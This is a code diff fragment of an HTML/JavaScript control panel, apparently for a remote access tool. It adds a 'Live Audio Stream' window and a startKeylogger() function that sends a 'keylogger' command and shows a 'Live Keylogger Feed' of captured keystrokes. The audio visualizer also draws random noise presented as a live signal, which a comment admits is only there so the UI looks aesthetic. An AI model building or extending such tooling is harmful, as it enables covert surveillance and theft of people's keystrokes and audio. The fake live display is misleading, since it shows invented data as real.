+    const win = createDragWindow('audio-win', 'Live Audio Stream (Beta)', 'fa-solid fa-microphone', 
+        '<canvas id="audio-canvas" width="570" height="300" style="width:100%; height:100%; object-fit: cover;"></canvas>');
+    
+    if(!audioCtx) {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    } else if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+    }
+    
+    const canvas = document.getElementById('audio-canvas');
+    const canvasCtx = canvas.getContext('2d');
+    
+    // Draw empty visualizer loop
+    function draw() {
+        if(!document.getElementById('audio-canvas')) return; // Window closed
+        audioDrawVisual = requestAnimationFrame(draw);
+        canvasCtx.fillStyle = 'rgba(15, 15, 20, 0.2)';
+        canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
+        canvasCtx.lineWidth = 2;
+        canvasCtx.strokeStyle = 'var(--accentPrimary)';
+        canvasCtx.beginPath();
+        // Just draw a flat line until we implement full analyzer feed, the UI must look aesthetic
+        canvasCtx.moveTo(0, canvas.height/2 + (Math.random()*10 - 5));
+        for(let i=0; i<canvas.width; i+=10) {
+            canvasCtx.lineTo(i, canvas.height/2 + (Math.random()*20 - 10));
+        }
+        canvasCtx.stroke();
+    }
+    if(!audioDrawVisual) draw();
+}
+
+function startKeylogger() {
+    cmd('keylogger');
+    const win = createDragWindow('keylog-win', 'Live Keylogger Feed', 'fa-solid fa-keyboard', '<div id="keylog-feed" style="white-space: pre-wrap;">Awaiting keystrokes...</div>');
+}
+
+// Intercept specific Result updates to feed them to Drag Windows instead of universal modal
+const originalHandleResult = window.handleResult || function(){};
+
+</script>
+</body>
+</html>
